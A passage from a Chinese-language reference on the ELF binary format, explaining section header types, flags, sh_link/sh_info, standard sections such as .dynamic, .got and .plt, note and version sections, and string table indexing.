\u8be5\u7c7b\u578b\u8282\u533a\u662f\u975e\u6d3b\u52a8\u7684\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u8282\u5934\u4e2d\u7684\u5176\u5b83\u6210\u5458\u53d6\u503c\u65e0\u610f\u4e49\u3002 SHT_PROGBITS 1 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u5b9a\u4e49\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u683c\u5f0f\u548c\u542b\u4e49\u90fd\u7531\u7a0b\u5e8f\u6765\u51b3\u5b9a\u3002 SHT_SYMTAB 2 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u8868\uff08 SYMbol TABle \uff09\u3002\u76ee\u524d\u76ee\u6807\u6587\u4ef6\u5bf9\u6bcf\u79cd\u7c7b\u578b\u7684\u8282\u533a\u90fd\u53ea \u80fd\u5305\u542b\u4e00\u4e2a\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u9650\u5236\u5c06\u6765\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002 \u4e00\u822c\uff0cSHT_SYMTAB \u8282\u533a\u63d0\u4f9b\u7528\u4e8e\u94fe\u63a5\u7f16\u8f91\uff08\u6307 ld \u800c\u8a00\uff09 \u7684\u7b26\u53f7\uff0c\u5c3d\u7ba1\u4e5f\u53ef\u7528\u6765\u5b9e\u73b0\u52a8\u6001\u94fe\u63a5\u3002 SHT_STRTAB 3 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u5b57\u7b26\u4e32\u8868\uff08 STRing TABle \uff09\u3002 SHT_RELA 4 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u663e\u5f0f\u6307\u5b9a\u4f4d\u6570\u7684\u91cd\u5b9a\u4f4d\u9879\uff08 RELocation entry with Addends \uff09\uff0c\u4f8b\u5982\uff0c32 \u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_Rela \u7c7b\u578b\u3002\u6b64\u5916\uff0c\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002 SHT_HASH 5 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\uff08 HASH table \uff09\u3002 SHT_DYNAMIC 6 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\uff08 DYNAMIC linking \uff09\u3002 SHT_NOTE 7 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6807\u8bb0\u6587\u4ef6\u7684\u4fe1\u606f\uff08 NOTE \uff09\u3002 SHT_NOBITS 8 \u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u5176\u5b83\u65b9\u9762\u548cSHT_PROGBITS\u76f8\u4f3c\u3002\u5c3d\u7ba1\u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u8282\uff0c\u5176\u5bf9\u5e94\u7684\u8282\u5934\u6210\u5458sh_offset \u4e2d\u8fd8\u662f\u4f1a\u5305\u542b\u6982\u5ff5\u6027\u7684\u6587\u4ef6\u504f\u79fb\u3002 SHT_REL 9 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u9879\uff08 RELocation entry without Addends \uff09\uff0c\u4e0d\u8fc7\u5e76\u6ca1\u6709\u6307\u5b9a\u4f4d\u6570\u3002\u4f8b\u5982\uff0c32\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_rel \u7c7b\u578b\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002 SHT_SHLIB 10 \u8be5\u7c7b\u578b\u6b64\u8282\u533a\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u5176\u8bed\u4e49\u5c1a\u672a\u88ab\u5b9a\u4e49\u3002 SHT_DYNSYM 11 \u4f5c\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u7b26\u53f7\u8868\uff0c\u5b83\u53ef\u80fd\u5305\u542b\u5f88\u591a\u5bf9\u52a8\u6001\u94fe\u63a5\u800c\u8a00\u4e0d\u5fc5 \u8981\u7684\u7b26\u53f7\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a SHT_DYNSYM \u8282\u533a\uff0c\u5176\u4e2d\u4fdd\u5b58\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u7684\u4e00\u4e2a\u6700\u5c0f\u96c6\u5408\uff0c\u4ee5\u8282\u7701\u7a7a\u95f4\u3002 SHT_LOPROC 0X70000000 \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0b\u754c\uff08 LOw PROCessor-specific semantics \uff09\u3002 SHT_HIPROC OX7FFFFFFF \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0a\u754c\uff08 HIgh PROCessor-specific semantics \uff09\u3002 SHT_LOUSER 0X80000000 \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0b\u754c\u3002 SHT_HIUSER 0X8FFFFFFF \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0a\u754c\u3002 sh_flags \u00b6 \u8282\u5934\u4e2d sh_flags \u5b57\u6bb5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u90fd\u53ef\u4ee5\u7ed9\u51fa\u5176\u76f8\u5e94\u7684\u6807\u8bb0\u4fe1\u606f\uff0c\u5176\u5b9a\u4e49\u4e86\u5bf9\u5e94\u7684\u8282\u533a\u7684\u5185\u5bb9\u662f\u5426\u53ef\u4ee5\u88ab\u4fee\u6539\u3001\u88ab\u6267\u884c\u7b49\u4fe1\u606f\u3002\u5982\u679c\u4e00\u4e2a\u6807\u5fd7\u4f4d\u88ab\u8bbe\u7f6e\uff0c\u5219\u8be5\u4f4d\u53d6\u503c\u4e3a1\uff0c\u672a\u5b9a\u4e49\u7684\u4f4d\u90fd\u4e3a0\u3002\u76ee\u524d\u5df2\u5b9a\u4e49\u503c\u5982\u4e0b\uff0c\u5176\u4ed6\u503c\u4fdd\u7559\u3002 \u540d\u79f0 \u503c \u8bf4\u660e SHF_WRITE 0x1 \u8fd9\u79cd\u8282\u5305\u542b\u4e86\u8fdb\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u88ab\u5199\u7684\u6570\u636e\u3002 SHF_ALLOC 0x2 \u8fd9\u79cd\u8282\u5728\u8fdb\u7a0b\u8fd0\u884c\u65f6\u5360\u7528\u5185\u5b58\u3002\u5bf9\u4e8e\u4e0d\u5360\u7528\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7a7a\u95f4\u7684\u67d0\u4e9b\u63a7\u5236\u8282\uff0c\u8be5\u5c5e\u6027\u5904\u4e8e\u5173\u95ed\u72b6\u6001(off)\u3002 SHF_EXECINSTR 0x4 \u8fd9\u79cd\u8282\u5305\u542b\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\uff08 EXECutable INSTRuction \uff09\u3002 SHF_MASKPROC 0xf0000000 \u6240\u6709\u5728\u8fd9\u4e2a\u63a9\u7801\u4e2d\u7684\u6bd4\u7279\u4f4d\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668\u8bed\u4e49\u3002 sh_link & sh_info \u00b6 \u5f53\u8282\u533a\u7c7b\u578b\u7684\u4e0d\u540c\u7684\u65f6\u5019\uff0csh_link \u548c sh_info \u4e5f\u4f1a\u5177\u6709\u4e0d\u540c\u7684\u542b\u4e49\u3002 sh_type sh_link sh_info SHT_DYNAMIC \u8282\u533a\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u8868\u7684\u8282\u5934\u7d22\u5f15 0 SHT_HASH \u6b64\u54c8\u5e0c\u8868\u6240\u4f7f\u7528\u7684\u7b26\u53f7\u8868\u7684\u8282\u5934\u7d22\u5f15 0 SHT_REL/SHT_RELA \u4e0e\u7b26\u53f7\u8868\u76f8\u5173\u7684\u7684\u8282\u5934\u7d22\u5f15 \u91cd\u5b9a\u4f4d\u5e94\u7528\u5230\u7684\u8282\u7684\u8282\u5934\u7d22\u5f15 SHT_SYMTAB/SHT_DYNSYM \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f\uff0cLinux \u4e2d\u7684 ELF \u6587\u4ef6\u4e2d\u8be5\u9879\u6307\u5411\u7b26\u53f7\u8868\u4e2d\u7b26\u53f7\u6240\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u8282\u533a\u5728 Section Header Table \u4e2d\u7684\u504f\u79fb\u3002 \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f other SHN_UNDEF 0 Sections \u00b6 \u8282\u533a\u5305\u542b\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86 ELF \u5934\u90e8\u3001\u7a0b\u5e8f\u5934\u90e8\u8868\u3001\u8282\u533a\u5934\u90e8\u8868\u7684\u6240\u6709\u4fe1\u606f\u3002\u8282\u533a\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u6bcf\u4e2a\u8282\u533a\u90fd\u6709\u5bf9\u5e94\u7684\u8282\u5934\u6765\u63cf\u8ff0\u5b83\u3002\u4f46\u662f\u53cd\u8fc7\u6765\uff0c\u8282\u533a\u5934\u90e8\u5e76\u4e0d\u4e00\u5b9a\u4f1a\u5bf9\u5e94\u7740\u4e00\u4e2a\u8282\u533a\u3002 \u6bcf\u4e2a\u8282\u533a\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u662f\u8fde\u7eed\u7684\uff0c\u4f46\u662f\u5927\u5c0f\u53ef\u80fd\u4e3a 0\u3002 \u4efb\u610f\u4e24\u4e2a\u8282\u533a\u4e0d\u80fd\u91cd\u53e0\uff0c\u5373\u4e00\u4e2a\u5b57\u8282\u4e0d\u80fd\u540c\u65f6\u5b58\u5728\u4e8e\u4e24\u4e2a\u8282\u533a\u4e2d\u3002 \u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u6709\u95f2\u7f6e\u7a7a\u95f4\uff08inactive space\uff09\uff0c\u5404\u79cd\u5934\u548c\u8282\u4e0d\u4e00\u5b9a\u4f1a\u8986\u76d6\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5b57\u8282\uff0c \u95f2\u7f6e\u533a\u57df\u7684\u5185\u5bb9\u672a\u6307\u5b9a \u3002 \u8bb8\u591a\u5728 ELF \u6587\u4ef6\u4e2d\u7684\u8282\u90fd\u662f\u9884\u5b9a\u4e49\u7684\uff0c\u5b83\u4eec\u5305\u542b\u7a0b\u5e8f\u548c\u63a7\u5236\u4fe1\u606f\u3002\u8fd9\u4e9b\u8282\u88ab\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u540c\u4e00\u8282\u533a\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u7c7b\u578b\u4ee5\u53ca\u5c5e\u6027\u3002 \u53ef\u6267\u884c\u6587\u4ef6\u662f\u7531\u94fe\u63a5\u5668\u5c06\u4e00\u4e9b\u5355\u72ec\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u5e93\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u800c\u5f97\u5230\u7684\u3002\u5176\u4e2d\uff0c\u94fe\u63a5\u5668\u4f1a\u89e3\u6790\u5f15\u7528\uff08\u4e0d\u540c\u6587\u4ef6\u4e2d\u7684\u5b50\u4f8b\u7a0b\u7684\u5f15\u7528\u4ee5\u53ca\u6570\u636e\u7684\u5f15\u7528\uff0c\u8c03\u6574\u5bf9\u8c61\u6587\u4ef6\u4e2d\u7684\u7edd\u5bf9\u5f15\u7528\uff09\u5e76\u4e14\u91cd\u5b9a\u4f4d\u6307\u4ee4\u3002\u52a0\u8f7d\u4e0e\u94fe\u63a5\u8fc7\u7a0b\u9700\u8981\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u4f1a\u5c06\u5904\u7406\u540e\u7684\u4fe1\u606f\u5b58\u50a8\u5728\u4e00\u4e9b\u7279\u5b9a\u7684\u8282\u533a\u4e2d\uff0c\u6bd4\u5982 .dynamic \u3002 \u6bcf\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u90fd\u4f1a\u652f\u6301\u4e00\u7ec4\u94fe\u63a5\u6a21\u578b\uff0c\u4f46\u8fd9\u4e9b\u6a21\u578b\u90fd\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd \u7c7b\u578b \u63cf\u8ff0 \u9759\u6001\u94fe\u63a5 \u9759\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u90fd\u88ab\u9759\u6001\u7ed1\u5b9a\u4e86\uff0c\u5176\u5f15\u7528\u5df2\u7ecf\u88ab\u89e3\u6790\u4e86\u3002 \u52a8\u6001\u94fe\u63a5 \u52a8\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u53ea\u662f\u5355\u7eaf\u5730\u88ab\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002\u5f53\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u65f6\u4f7f\u7528\u5230\u76f8\u5e94\u51fd\u6570\u65f6\uff0c\u76f8\u5e94\u7684\u51fd\u6570\u5730\u5740\u624d\u4f1a\u88ab\u89e3\u6790\u3002 \u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8282\u53ef\u4ee5\u652f\u6301\u8c03\u8bd5\uff0c\u6bd4\u5982\u8bf4 .debug \u4ee5\u53ca .line \u8282\uff1b\u652f\u6301\u7a0b\u5e8f\u63a7\u5236\u7684\u8282\u6709 .bss\uff0c.data\uff0c .data1\uff0c .rodata\uff0c .rodata1\u3002 \u540d\u79f0 \u7c7b\u578b \u5c5e\u6027 \u542b\u4e49 .comment SHT_PROGBITS \u5305\u542b\u7248\u672c\u63a7\u5236\u4fe1\u606f\u3002 .debug SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u7b26\u53f7\u8c03\u8bd5\u7684\u4fe1\u606f\u3002 .dynamic SHT_DYNAMIC SHF_ALLOC SHF_WRITE \u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002SHF_WRITE \u4f4d\u8bbe\u7f6e\u4e0e\u5426\u662f\u5426\u88ab\u8bbe\u7f6e\u53d6\u51b3\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\u3002 .dynstr SHT_STRTAB SHF_ALLOC \u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u52a8\u6001\u94fe\u63a5\u7684\u5b57\u7b26\u4e32\uff0c\u5927\u591a\u6570 \u60c5\u51b5\u4e0b\u8fd9\u4e9b\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86\u4e0e\u7b26\u53f7\u8868\u9879\u76f8\u5173\u7684\u540d\u79f0\u3002 .dynsym SHT_DYNSYM SHF_ALLOC \u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u3002 .got SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u5168\u5c40\u504f\u79fb\u8868\u3002 .line SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u7b26\u53f7\u8c03\u8bd5\u7684\u884c\u53f7\u4fe1\u606f\uff0c\u63cf\u8ff0\u4e86\u6e90\u7a0b\u5e8f\u4e0e\u673a\u5668\u6307\u4ee4\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5176\u5185\u5bb9\u662f\u672a\u5b9a\u4e49\u7684\u3002 .plt SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u8fc7\u7a0b\u94fe\u63a5\u8868\uff08procedure linkage table\uff09\u3002 .relname SHT_REL \u8fd9\u4e9b\u8282\u533a\u4e2d\u5305\u542b\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u5305\u542b\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u6bb5\u4e2d\u6709\u91cd\u5b9a\u4f4d\u5185\u5bb9\uff0c\u8282\u533a\u7684\u5c5e\u6027\u5c06\u5305\u542bSHF_ALLOC\u4f4d\uff0c\u5426\u5219\u8be5\u4f4d\u7f6e 0\u3002\u4f20\u7edf\u4e0a name \u6839\u636e\u91cd\u5b9a\u4f4d\u6240\u9002\u7528\u7684\u8282\u533a\u7ed9\u5b9a\u3002\u4f8b\u5982 .text \u8282\u533a\u7684\u91cd\u5b9a\u4f4d\u8282\u533a\u540d\u5b57\u5c06\u662f\uff1a.rel.text \u6216\u8005 .rela.text\u3002 .relaname SHT_RELA .shstrtab SHT_STRTAB \u6b64\u8282\u533a\u5305\u542b\u8282\u533a\u540d\u79f0\u3002 \u6ce8\u610f\uff1a \u4ee5 \u201c.\u201d \u5f00\u5934\u7684\u8282\u533a\u540d\u79f0\u662f\u7cfb\u7edf\u4fdd\u7559\u7684\uff0c\u5f53\u7136\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u8282\u533a\u3002\u4e3a\u4e86\u907f\u514d\u4e0e\u7cfb\u7edf\u8282\u533a\u51b2\u7a81\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5c3d\u91cf\u4f7f\u7528\u6ca1\u6709\u524d\u7f00\u7684\u8282\u533a\u540d\u79f0\u3002 \u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u5141\u8bb8\u5b9a\u4e49\u4e0d\u5728\u4e0a\u8ff0\u5217\u8868\u4e2d\u7684\u8282\u533a\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u540d\u5b57\u76f8\u540c\u7684\u8282\u533a\u3002 \u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u8282\u533a\u540d\u79f0\u4e00\u822c\u547d\u540d\u89c4\u5219\u4e3a\uff1a\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u540d\u79f0\u7b80\u5199+ \u8282\u533a\u540d\u79f0\u3002\u5176\u4e2d\uff0c\u5904\u7406\u5668\u540d\u79f0\u5e94\u8be5\u4e0e e_machine \u4e2d\u4f7f\u7528\u7684\u540d\u79f0\u76f8\u540c\u3002\u4f8b\u5982 .FOO.psect \u8282\u533a\u662f FOO \u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684 psect \u8282\u533a\u3002 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684\u5206\u7c7b\u5373\u6bb5\u7c7b\u578b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u540c\u65f6\u4e5f\u4f1a\u52a0\u4e0a\u81ea\u5df1\u7684\u4e00\u4e9b\u7b80\u5355\u5206\u7c7b\u3002 Note related sections \u00b6 \u6709\u65f6\u5019\u751f\u4ea7\u5382\u5546\u6216\u8005\u7cfb\u7edf\u6784\u5efa\u8005\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u7279\u6b8a\u7684\u4fe1\u606f\u6765\u6807\u8bb0ELF\u6587\u4ef6\uff0c\u4ece\u800c\u5176\u5b83\u7a0b\u5e8f\u53ef\u4ee5\u6765\u68c0\u67e5\u8be5ELF\u6587\u4ef6\u7684\u4e00\u81f4\u6027\u4ee5\u53ca\u517c\u5bb9\u6027\u3002\u8282\u533a\u7c7b\u578b\u4e3a SHT_NOTE \u6216\u8005\u7a0b\u5e8f\u5934\u90e8\u7c7b\u578b\u4e3a PT_NOTE \u7684\u5143\u7d20\u7528\u4e8e\u6765\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\uff0c\u5b83\u4eec\u4e2d\u5bf9\u8c61\u7684\u8868\u9879\u53ef\u80fd\u5305\u542b\u4e00\u5230\u591a\u4e2a\uff0c\u6bcf\u4e00\u4e2a\u8868\u9879\u90fd\u662f\u76ee\u6807\u5904\u7406\u5668\u683c\u5f0f\u7684 4 \u5b57\u8282\u6570\u7ec4\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u4e00\u4e9b\u53ef\u80fd\u7684\u6ce8\u91ca\u4fe1\u606f\u3002\u4f46\u662f\u8fd9\u5e76\u4e0d\u5728 ELF \u6587\u4ef6\u7684\u89c4\u8303\u5185\u3002 namesz\u4e0ename name\u7684\u524dnamesz\u5b57\u8282\u5305\u542b\u4e86\u4e00\u4e2a\u4ee5NULL\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u8868\u793a\u8be5\u9879\u7684\u62e5\u6709\u8005\u6216\u8005\u53d1\u8d77\u4eba\u3002\u4f46\u662f\u76ee\u524d\u5e76\u6ca1\u6709\u907f\u514d\u51b2\u7a81\u7684\u683c\u5f0f\u5316\u7684\u547d\u540d\u673a\u5236\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u751f\u4ea7\u5382\u5546\u4f1a\u4f7f\u7528\u4ed6\u4eec\u81ea\u5df1\u516c\u53f8\u7684\u540d\u5b57\uff0c\u4f8b\u5982\u201cXYZ Computer Company\u201d\u6765\u5f53\u505a\u5bf9\u5e94\u7684\u6807\u5fd7\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u540d\u5b57\u7684\u8bdd\uff0cnamesz\u5e94\u8be5\u662f0\u3002\u90a3\u4e48\u5728name\u7684\u5730\u65b9\u5e94\u8be5\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002 descsz\u4e0edesc desc\u7684\u524ddescsz\u5b57\u8282\u5305\u542b\u4e86\u6ce8\u91ca\u7684\u63cf\u8ff0\u3002ELF\u6587\u4ef6\u5bf9\u4e8e\u63cf\u8ff0\u7684\u5185\u5bb9\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u63cf\u8ff0\u7684\u8bdd\uff0cdescsz\u5e94\u8be5\u4e3a0\u3002\u5f53\u7136\uff0c\u5e94\u8be5\u5728desc\u5904\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002 type \u8fd9\u4e2a\u5b57\u6bb5\u7ed9\u51fa\u4e86\u63cf\u8ff0\u7684\u89e3\u91ca\uff0c\u5bf9\u4e8e\u4e0d\u540c\u90a3\u4e2a\u7684\u53d1\u8d77\u8005\u6765\u8bf4\uff0c\u4ed6\u4eec\u90fd\u5fc5\u987b\u63a7\u5236\u81ea\u5df1\u7684\u7c7b\u578b\uff0c\u5bf9\u4e8e\u540c\u4e00\u7c7b\u578b\u6765\u8bf4\uff0c\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u63cf\u8ff0\u4e0e\u5176\u5bf9\u5e94\u3002\u56e0\u6b64\uff0c\u53d1\u8d77\u8005\u5fc5\u987b\u80fd\u591f\u8bc6\u522b\u540d\u5b57\u4ee5\u53ca\u7c7b\u578b\u4ee5\u4fbf\u4e8e\u6765\u7406\u89e3\u5bf9\u5e94\u7684\u63cf\u8ff0\u3002\u76ee\u524d\u6765\u8bf4\uff0c\u7c7b\u578b\u4e0d\u80fd\u591f\u4e3a\u975e\u8d1f\u503c\uff0cELF\u6587\u4ef6\u7684\u89c4\u8303\u91cc\u5e76\u4e0d\u5b9a\u4e49\u63cf\u8ff0\u7b26\u7684\u610f\u601d\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48type\u5728\u524d\u9762\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e00\u4e0b \u8fd9\u91cc\u5305\u542b\u4e86\u4e24\u4e2a\u8868\u9879\u3002 \u5728 Linux \u4e2d\uff0c\u4e0e Note \u76f8\u5173\u7684\u8282\u5305\u542b\u4e86 ELF \u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u6ce8\u91ca\u4fe1\u606f\uff0c\u4e3b\u8981\u5305\u542b\u4e24\u4e2a\u8282 .note.ABI-tag .note.gnu.build-id \u4f8b\u5b50 \u00b6 version releated sections \u00b6 ELF \u6587\u4ef6\u4e0d\u4ec5\u53ef\u4ee5\u5bfc\u5165\u5916\u90e8\u7684\u7b26\u53f7\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5bfc\u5165\u6307\u5b9a\u7248\u672c\u7684\u7b26\u53f7\u3002\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u4ece GLIBC_2.2.5 \u4e2d\u5bfc\u5165\u5176\u4e2d\u7684\u4e00\u4e9b\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u6bd4\u5982 printf\u3002\u5176\u4e2d\uff0c.gnu.version_r \u4fdd\u5b58\u4e86\u7248\u672c\u7684\u5b9a\u4e49\uff0c\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u662f Elf_Verdef\u3002 \u5982\u4e0b .gnu.version\uff0cVersions of symbols. .gnu.version_d\uff0cVersion definitions of symbols. .gnu.version_r\uff0cVersion references (version needs) of symbols. \u4f8b\u5b50 \u00b6 .strtab: String Table \u00b6 \u8be5\u8282\u533a\u63cf\u8ff0\u9ed8\u8ba4\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002ELF \u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u5b58\u50a8\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u540d\uff0c\u5305\u62ec \u53d8\u91cf\u540d \u51fd\u6570\u540d \u8be5\u8282\u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u9700\u8981\u52a0\u8f7d\uff0c\u53ea\u9700\u8981\u52a0\u8f7d\u5bf9\u5e94\u7684\u5b50\u96c6 .dynstr \u8282\u3002 \u4e00\u822c\u901a\u8fc7\u5bf9\u5b57\u7b26\u4e32\u7684\u9996\u4e2a\u5b57\u6bcd\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u7684\u4e0b\u6807\u6765\u7d22\u5f15\u5b57\u7b26\u4e32\u3002 \u5b57\u7b26\u4e32\u8868\u7684\u9996\u5c3e\u5b57\u8282\u90fd\u662fNULL\u3002\u6b64\u5916\uff0c\u7d22\u5f15\u4e3a0\u7684\u5b57\u7b26\u4e32\u8981\u4e48\u6ca1\u6709\u540d\u5b57\uff0c\u8981\u4e48\u5c31\u662f\u540d\u5b57\u4e3a\u7a7a\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u4e0a\u4e0b\u6587\u3002\u5b57\u7b26\u4e32\u8868\u4e5f\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u76f8\u5e94\u7684\uff0c\u5176\u8282\u533a\u5934\u90e8\u7684 sh_size \u6210\u5458\u5c06\u4e3a0\u3002\u5728\u7a7a\u5b57\u7b26\u4e32\u8868\u4e2d\u7d22\u5f15\u5927\u4e8e 0 \u7684\u4e0b\u6807\u663e\u7136\u662f\u975e\u6cd5\u7684\u3002 \u4e00\u4e2a\u8282\u533a\u5934\u90e8\u7684 sh_name \u6210\u5458\u7684\u503c\u4e3a\u5176\u76f8\u5e94\u7684\u8282\u533a\u5934\u90e8\u5b57\u7b26\u4e32\u8868\u8282\u533a\u7684\u7d22\u5f15\uff0c\u6b64\u8282\u533a\u7531 ELF \u5934\u7684 e_shstrndx \u6210\u5458\u7ed9\u51fa\u3002\u4e0b\u56fe\u7ed9\u51fa\u4e86\u4e00\u4e2a\u5305\u542b 25 \u4e2a\u5b57\u8282\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u4ee5\u53ca\u4e0e\u4e0d\u540c\u7d22\u5f15\u76f8\u5173\u7684\u5b57\u7b26\u4e32\u3002 \u7d22\u5f15 +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 0 \\0 n a m e . \\0 V a r 10 i a b l e \\0 a b l e 20 \\0 \\0 x x \\0 \u5176\u4e2d\u5305\u542b\u7684\u5b57\u7b26\u4e32\u6709 \u7d22\u5f15 \u5b57\u7b26\u4e32 0 none 1 name. 7 Variable 11 able 16 able 24 \u7a7a\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u51fa 